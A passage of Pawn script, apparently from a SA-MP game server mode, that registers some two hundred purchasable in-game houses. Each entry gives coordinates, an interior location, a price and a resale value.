	AddHouse(514, 2707.316162, -1203.208862, 69.688049, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 515); //A small house ;)
	AddHouse(515, 2707.313720, -1199.920288, 70.461990, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 516); //A small house ;)
	AddHouse(516, 2663.121337, -1200.032104, 66.467224, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 517); //A small house ;)
	AddHouse(517, 2663.175292, -1203.241210, 65.685409, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 518); //A small house ;)
	AddHouse(518, 2663.176025, -1207.519653, 64.760864, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 519); //A small house ;)
	AddHouse(519, 2663.177978, -1211.770629, 63.623802, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 520); //A small house ;)
	AddHouse(520, 2663.178222, -1216.233886, 62.223739, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 521); //A small house ;)
	AddHouse(521, 2663.177001, -1220.525146, 60.874816, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 522); //A small house ;)
	AddHouse(522, 2663.171142, -1224.628784, 59.586509, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 523); //A small house ;)
	AddHouse(523, 2663.172363, -1229.135253, 58.300003, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 524); //A small house ;)
	AddHouse(524, 2663.177246, -1233.429199, 57.071487, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 525); //A small house ;)
	AddHouse(525, 2663.177734, -1237.991455, 55.673789, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 526); //A small house ;)
	AddHouse(526, 2700.199707, -1238.146240, 58.182823, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 527); //A small house ;)
	AddHouse(527, 2700.205078, -1233.368041, 59.581157, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 528); //A small house ;)
	AddHouse(528, 2700.204833, -1229.407226, 60.810646, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 529); //A small house ;)
	AddHouse(529, 2700.203613, -1224.654174, 62.095821, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 530); //A small house ;)
	AddHouse(530, 2700.138671, -1220.463623, 63.375606, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 531); //A small house ;)
	AddHouse(531, 2700.200439, -1216.365234, 64.737869, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 532); //A small house ;)
	AddHouse(532, 2700.206054, -1211.774291, 66.128273, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 533); //A small house ;)
	AddHouse(533, 2700.204345, -1207.410034, 67.261642, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 534); //A small house ;)
	AddHouse(534, 2700.194580, -1203.083618, 68.193725, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 535); //A small house ;)
	AddHouse(535, 2700.206054, -1199.946777, 68.970581, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 536); //A small house ;)
	AddHouse(536, 2690.558837, -1199.880615, 68.300178, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 537); //A small house ;)
	AddHouse(537, 2690.552978, -1203.218505, 67.524497, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 538); //A small house ;)
	AddHouse(538, 2690.546630, -1207.511596, 66.589035, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 539); //A small house ;)
	AddHouse(539, 2690.549560, -1211.862548, 65.455917, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 540); //A small house ;)
	AddHouse(540, 2690.548095, -1216.268676, 64.066390, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 541); //A small house ;)
	AddHouse(541, 2690.552978, -1220.520629, 62.718112, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 542); //A small house ;)
	AddHouse(542, 2690.547851, -1224.704833, 61.423622, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 543); //A small house ;)
	AddHouse(543, 2690.542236, -1229.389160, 60.137016, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 544); //A small house ;)
	AddHouse(544, 2690.550292, -1233.521972, 58.909164, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 545); //A small house ;)
	AddHouse(545, 2690.541259, -1238.107055, 57.510063, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 546); //A small house ;)
	AddHouse(546, 2683.180419, -1237.947387, 55.942508, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 547); //A small house ;)
	AddHouse(547, 2683.432373, -1233.423583, 57.415611, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 548); //A small house ;)
	AddHouse(548, 2683.439941, -1229.291015, 58.646739, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 549); //A small house ;)
	AddHouse(549, 2683.428222, -1224.631835, 59.929710, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 550); //A small house ;)
	AddHouse(550, 2683.428955, -1220.406372, 61.223278, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 551); //A small house ;)
	AddHouse(551, 2683.439697, -1216.208007, 62.574832, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 552); //A small house ;)
	AddHouse(552, 2683.439941, -1211.859375, 63.964103, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 553); //A small house ;)
	AddHouse(553, 2683.438232, -1207.586425, 65.097480, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 554); //A small house ;)
	AddHouse(554, 2683.432617, -1203.033569, 66.030433, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 555); //A small house ;)
	AddHouse(555, 2683.432373, -1199.989868, 66.804832, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 556); //A small house ;)
	AddHouse(556, 2622.237304, -1237.907592, 51.272949, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 557); //A small house ;)
	AddHouse(557, 2622.224365, -1233.339477, 52.667438, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 558); //A small house ;)
	AddHouse(558, 2622.217285, -1229.401977, 53.895496, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 559); //A small house ;)
	AddHouse(559, 2622.239746, -1224.604858, 55.185638, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 560); //A small house ;)
	AddHouse(560, 2622.219482, -1220.683837, 56.474800, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 561); //A small house ;)
	AddHouse(561, 2622.227783, -1216.259521, 57.825839, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 562); //A small house ;)
	AddHouse(562, 2622.218750, -1211.676879, 59.213169, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 563); //A small house ;)
	AddHouse(563, 2622.227294, -1207.700195, 60.348693, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 564); //A small house ;)
	AddHouse(564, 2622.213378, -1203.043212, 61.279903, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 565); //A small house ;)
	AddHouse(565, 2622.216796, -1199.960693, 62.055072, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 566); //A small house ;)
	AddHouse(566, 2615.112304, -1200.213623, 60.781250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 567); //A small house ;)
	AddHouse(567, 2615.104492, -1202.936035, 60.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 568); //A small house ;)
	AddHouse(568, 2615.096191, -1207.554443, 59.070312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 569); //A small house ;)
	AddHouse(569, 2614.964111, -1211.656982, 57.937500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 570); //A small house ;)
	AddHouse(570, 2615.110351, -1216.223876, 56.539062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 571); //A small house ;)
	AddHouse(571, 2615.106201, -1220.595214, 55.187500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 572); //A small house ;)
	AddHouse(572, 2615.010253, -1224.851562, 53.898437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 573); //A small house ;)
	AddHouse(573, 2615.112060, -1229.404174, 52.609375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 574); //A small house ;)
	AddHouse(574, 2615.107666, -1233.483154, 51.382812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 575); //A small house ;)
	AddHouse(575, 2615.111816, -1238.164672, 49.984375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 576); //A small house ;)
	AddHouse(576, 2608.151367, -1238.124755, 50.205532, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 577); //A small house ;)
	AddHouse(577, 2608.151367, -1233.472167, 51.602737, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 578); //A small house ;)
	AddHouse(578, 2608.170410, -1229.249023, 52.836273, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 579); //A small house ;)
	AddHouse(579, 2608.159912, -1224.709594, 54.119499, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 580); //A small house ;)
	AddHouse(580, 2608.153808, -1220.607666, 55.411632, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 581); //A small house ;)
	AddHouse(581, 2608.180419, -1216.270874, 56.766517, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 582); //A small house ;)
	AddHouse(582, 2608.164794, -1211.844360, 58.152462, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 583); //A small house ;)
	AddHouse(583, 2608.165527, -1207.470947, 59.286346, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 584); //A small house ;)
	AddHouse(584, 2608.171386, -1203.139404, 60.221706, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 585); //A small house ;)
	AddHouse(585, 2608.159912, -1200.168945, 60.993751, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 586); //A small house ;)
	AddHouse(586, 2601.049560, -1200.140136, 59.501785, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 587); //A small house ;)
	AddHouse(587, 2601.044433, -1203.052368, 58.726257, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 588); //A small house ;)
	AddHouse(588, 2601.046875, -1207.525146, 57.792636, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 589); //A small house ;)
	AddHouse(589, 2601.042724, -1211.813964, 56.658035, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 590); //A small house ;)
	AddHouse(590, 2601.049560, -1216.296264, 55.270248, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 591); //A small house ;)
	AddHouse(591, 2601.045898, -1220.645874, 53.920177, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 592); //A small house ;)
	AddHouse(592, 2601.045166, -1224.663330, 52.626609, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 593); //A small house ;)
	AddHouse(593, 2601.034423, -1229.208251, 51.338928, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 594); //A small house ;)
	AddHouse(594, 2601.047363, -1233.376831, 50.112102, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 595); //A small house ;)
	AddHouse(595, 2601.048339, -1238.047241, 48.715099, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 596); //A small house ;)
	AddHouse(596, 2594.502441, -1238.135620, 48.564414, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 597); //A small house ;)
	AddHouse(597, 2594.517333, -1233.463500, 49.962112, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 598); //A small house ;)
	AddHouse(598, 2594.507568, -1229.438110, 51.190628, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 599); //A small house ;)
	AddHouse(599, 2594.529785, -1224.870239, 52.477134, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 600); //A small house ;)
	AddHouse(600, 2594.509521, -1220.475830, 53.765441, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 601); //A small house ;)
	AddHouse(601, 2594.518554, -1216.417846, 55.114364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 602); //A small house ;)
	AddHouse(602, 2594.499755, -1211.702880, 56.514427, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 603); //A small house ;)
	AddHouse(603, 2594.497802, -1207.676635, 57.651489, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 604); //A small house ;)
	AddHouse(604, 2594.500976, -1202.994873, 58.576034, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 605); //A small house ;)
	AddHouse(605, 2594.500000, -1200.118896, 59.357849, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 606); //A small house ;)
	AddHouse(606, 2587.396484, -1200.031738, 59.357849, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 607); //A small house ;)
	AddHouse(607, 2587.397216, -1203.067871, 58.576034, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 608); //A small house ;)
	AddHouse(608, 2587.396484, -1207.440185, 57.651489, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 609); //A small house ;)
	AddHouse(609, 2587.395751, -1211.868164, 56.514427, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 610); //A small house ;)
	AddHouse(610, 2587.396484, -1216.360839, 55.114364, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 611); //A small house ;)
	AddHouse(611, 2587.394775, -1220.645996, 53.765441, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 612); //A small house ;)
	AddHouse(612, 2587.396728, -1224.729248, 52.477134, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 613); //A small house ;)
	AddHouse(613, 2587.388427, -1229.404296, 51.190628, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 614); //A small house ;)
	AddHouse(614, 2587.382080, -1233.441406, 49.962112, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 615); //A small house ;)
	AddHouse(615, 2587.388183, -1238.048461, 48.564414, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 616); //A small house ;)
	AddHouse(616, 2550.007568, -1197.524658, 60.841514, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 617);//Big house
	AddHouse(617, 2520.809082, -1198.003295, 56.599781, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 618);//Big house
	AddHouse(618, 2467.542236, -1200.399780, 36.811664, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 619); //A small house ;)
	AddHouse(619, 2550.908935, -1234.145629, 49.001361, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 620); //A small house ;)
	AddHouse(620, 2529.728027, -1243.323974, 43.971870, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 621); //A small house ;)
	AddHouse(621, 2492.103271, -1239.011474, 37.905414, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 622); //A small house ;)
	AddHouse(622, 2514.697021, -1240.455200, 39.340587, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 623);//Big house
	AddHouse(623, 2473.263671, -1238.120971, 32.569477, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 624); //A small house ;)
	AddHouse(624, 2469.182861, -1278.505615, 30.366352, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 625); //A small house ;)
	AddHouse(625, 2470.371337, -1295.479492, 30.233222, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 626); //A small house ;)
	AddHouse(626, 2433.604492, -1275.114868, 24.756660, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 627); //A small house ;)
	AddHouse(627, 2434.807373, -1289.190063, 25.347854, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 628); //A small house ;)
	AddHouse(628, 2434.202636, -1303.490844, 24.987949, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 629); //A small house ;)
	AddHouse(629, 2433.960205, -1320.608642, 25.323432, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 630); //A small house ;)
	AddHouse(630, 2439.764648, -1356.992553, 24.100118, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 631);//Big house
	AddHouse(631, 2439.590576, -1338.916870, 24.101562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 632);//Big house
	AddHouse(632, 2383.532958, -1366.406250, 24.491352, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 633); //A small house ;)
	AddHouse(633, 2389.712402, -1346.020263, 25.076972, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 634); //A small house ;)
	AddHouse(634, 2387.847167, -1328.375610, 25.124164, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 635); //A small house ;)
	AddHouse(635, 2388.238769, -1279.919189, 25.129104, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 636); //A small house ;)
	AddHouse(636, 2373.974121, -1138.921020, 29.058792, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 637); //A small house ;)
	AddHouse(637, 2394.629638, -1133.538085, 30.718750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 638); //A small house ;)
	AddHouse(638, 2427.506347, -1135.774658, 34.710937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 639); //A small house ;)
	AddHouse(639, 2487.999511, -1135.434204, 39.554912, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 640); //A small house ;)
	AddHouse(640, 2510.571044, -1132.365722, 41.620693, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 641); //A small house ;)
	AddHouse(641, 2334.810791, -1203.997558, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 642);//Big house
	AddHouse(642, 2324.302490, -1218.863769, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 643);//Big house
	AddHouse(643, 2334.738769, -1234.486816, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 644);//Big house
	AddHouse(644, 2334.580322, -1266.114135, 27.969293, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 645);//Big house
	AddHouse(645, 2324.236572, -1249.539306, 27.976562, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 646);//Big house
	AddHouse(646, 2324.188232, -1280.978271, 27.982383, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 647);//Big house
	AddHouse(647, 2625.953613, -1112.678833, 67.995307, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 648);//Big house
	AddHouse(648, 2626.124755, -1098.825317, 69.349334, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 649);//Big house
	AddHouse(649, 2627.815673, -1084.953613, 69.616455, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 650);//Big house
	AddHouse(650, 2628.103759, -1068.094116, 69.715583, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 651);//Big house
	AddHouse(651, 2576.679687, -1070.831420, 69.832229, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 652); //A small house ;)
	AddHouse(652, 2572.224121, -1091.688720, 67.225723, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 653); //A small house ;)
	AddHouse(653, 2519.032470, -1113.129760, 56.592597, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 654); //A small house ;)
	AddHouse(654, 2470.898925, -1105.319213, 44.487880, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 655); //A small house ;)
	AddHouse(655, 2456.855712, -1101.874755, 43.867187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 656); //A small house ;)
	AddHouse(656, 2438.506347, -1105.369750, 42.751155, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 657); //A small house ;)
	AddHouse(657, 2408.028564, -1106.696166, 40.295722, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 658); //A small house ;)
	AddHouse(658, 2454.177734, -964.815124, 80.073120, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 659); //A small house ;)
	AddHouse(659, 2472.589355, -962.050048, 80.525466, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 660); //A small house ;)
	AddHouse(660, 2459.627929, -947.874267, 80.083465, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 661); //A small house ;)
	AddHouse(661, 2499.417968, -947.049316, 82.470779, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 662); //A small house ;)
	AddHouse(662, 2492.096923, -965.767761, 82.548904, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 663); //A small house ;)
	AddHouse(663, 2517.865234, -965.219970, 82.328369, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 664); //A small house ;)
	AddHouse(664, 2531.252685, -963.281188, 82.368873, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 665); //A small house ;)
	AddHouse(665, 2552.055664, -958.505249, 82.609397, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 666); //A small house ;)
	AddHouse(666, 2581.517822, -969.362915, 81.364639, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 667); //A small house ;)
	AddHouse(667, 2582.895263, -952.930297, 81.388031, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 668); //A small house ;)
	AddHouse(668, 2579.678222, -1033.208129, 69.579795, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 669); //A small house ;)
	AddHouse(669, 2562.112060, -1034.333251, 69.869216, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 670); //A small house ;)
	AddHouse(670, 2549.204833, -1032.252563, 69.578857, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 671); //A small house ;)
	AddHouse(671, 2526.809082, -1033.537231, 69.579238, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 672); //A small house ;)
	AddHouse(672, 2534.330566, -1063.246459, 69.565628, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 673); //A small house ;)
	AddHouse(673, 2526.100097, -1060.715942, 69.970779, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 674); //A small house ;)
	AddHouse(674, 2499.750488, -1065.675170, 70.235939, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 675); //A small house ;)
	AddHouse(675, 2512.709472, -1027.156860, 70.085937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 676); //A small house ;)
	AddHouse(676, 2479.744384, -1063.764892, 66.998245, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 677); //A small house ;)
	AddHouse(677, 2457.259765, -1054.612060, 59.742187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 678); //A small house ;)
	AddHouse(678, 2462.424560, -1011.119079, 60.113681, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 679); //A small house ;)
	AddHouse(679, 2491.329833, -1012.369079, 65.398437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 680); //A small house ;)
	AddHouse(680, 2440.411132, -1057.338867, 54.738681, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 681); //A small house ;)
	AddHouse(681, 2440.785156, -1010.667419, 54.343750, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 682); //A small house ;)
	AddHouse(682, 2389.290283, -1037.258789, 53.551792, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 683); //A small house ;)
	AddHouse(683, 2370.061279, -1034.557983, 54.410556, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 684); //A small house ;)
	AddHouse(684, 2355.508056, -1038.589965, 54.335803, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 685); //A small house ;)
	AddHouse(685, 2335.131835, -1046.004028, 52.552936, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 686); //A small house ;)
	AddHouse(686, 2362.705078, -1046.425415, 54.273303, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 687); //A small house ;)
	AddHouse(687, 2319.556640, -1053.315307, 52.351562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 688); //A small house ;)
	AddHouse(688, 2330.154052, -1060.899780, 52.468616, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 689); //A small house ;)
	AddHouse(689, 2297.630615, -1053.035888, 49.933994, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 690); //A small house ;)
	AddHouse(690, 2284.053710, -1046.010375, 49.887119, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 691); //A small house ;)
	AddHouse(691, 2287.841796, -1081.203735, 48.246002, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 692); //A small house ;)
	AddHouse(692, 2278.533691, -1077.310668, 48.234825, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 693); //A small house ;)
	AddHouse(693, 2249.954589, -1060.199584, 55.968750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 694);//Big house
	AddHouse(694, 2259.272705, -1019.292785, 59.296161, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 695);//Big house
	AddHouse(695, 2218.832519, -1031.753295, 60.263740, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 696); //A small house ;)
	AddHouse(696, 2208.083496, -1026.448120, 61.223251, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 697); //A small house ;)
	AddHouse(697, 2186.473388, -997.321960, 66.468750, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 698);//Big house
	AddHouse(698, 2139.919189, -1008.471984, 61.986602, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 699); //A small house ;)
	AddHouse(699, 2153.586425, -980.164001, 63.293369, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 700); //A small house ;)
	AddHouse(700, 2143.246582, -978.481933, 61.379306, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 701); //A small house ;)
	AddHouse(701, 2122.153320, -969.951416, 58.207431, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 702); //A small house ;)
	AddHouse(702, 2131.830078, -974.118225, 59.785556, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 703); //A small house ;)
	AddHouse(703, 2108.751708, -1000.713806, 60.507812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 704); //A small house ;)
	AddHouse(704, 2090.077636, -995.719848, 52.876029, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 705); //A small house ;)
	AddHouse(705, 2066.180175, -993.008850, 48.799594, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 706); //A small house ;)
	AddHouse(706, 2049.079345, -987.252136, 44.953018, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 707); //A small house ;)
	AddHouse(707, 2044.901977, -991.271423, 43.311088, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 708); //A small house ;)
	AddHouse(708, 2073.191162, -965.252929, 49.256046, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 709); //A small house ;)
	AddHouse(709, 2051.249267, -954.637145, 48.034400, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 710); //A small house ;)
	AddHouse(710, 2045.030395, -965.619445, 44.422283, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 711); //A small house ;)
	AddHouse(711, 2015.612304, -978.113159, 36.570865, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 712); //A small house ;)
	AddHouse(712, 2007.362670, -984.827697, 34.257812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 713); //A small house ;)
	AddHouse(713, 2000.260009, -991.600097, 32.131359, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 714); //A small house ;)
	AddHouse(714, 2090.439941, -972.477172, 51.831867, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 715); //A small house ;)
	AddHouse(715, 2188.625976, -1081.732055, 43.835128, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 716);//Big house
	AddHouse(716, 2221.355224, -1083.322387, 41.779808, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 717);//Big house
	AddHouse(717, 2140.300781, -1082.650634, 24.781269, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 718); //A small house ;)
	AddHouse(718, 2145.190429, -1084.896728, 24.801668, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 719); //A small house ;)
	AddHouse(719, 1959.598144, -1069.983642, 24.796701, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 720); //A small house ;)
	AddHouse(720, 1954.386108, -1074.938354, 24.796701, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 721); //A small house ;)
	AddHouse(721, 1934.084106, -1071.540405, 24.415821, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 722); //A small house ;)
	AddHouse(722, 1939.328857, -1066.133422, 24.418302, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 723); //A small house ;)
	AddHouse(723, 1916.884399, -1064.818725, 24.124662, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 724); //A small house ;)
	AddHouse(724, 1912.616577, -1070.401245, 24.236860, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 725); //A small house ;)
	AddHouse(725, 1896.040161, -1064.733276, 23.937500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 726); //A small house ;)
	AddHouse(726, 1891.772827, -1070.587158, 23.937500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 727); //A small house ;)
	AddHouse(727, 2249.641601, -1238.769409, 25.898437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 728); //A small house ;)
	AddHouse(728, 2229.446777, -1241.410522, 25.656250, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 729); //A small house ;)
	AddHouse(729, 2209.842529, -1239.985229, 24.149595, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 730); //A small house ;)
	AddHouse(730, 2191.812011, -1238.836914, 24.157409, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 731); //A small house ;)
	AddHouse(731, 2250.478027, -1280.055786, 25.476562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 732); //A small house ;)
	AddHouse(732, 2150.170898, -1285.401611, 24.196470, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 733); //A small house ;)
	AddHouse(733, 2132.177490, -1280.045532, 25.890625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 734); //A small house ;)
	AddHouse(734, 2149.851074, -1433.907714, 26.070312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 735); //A small house ;)
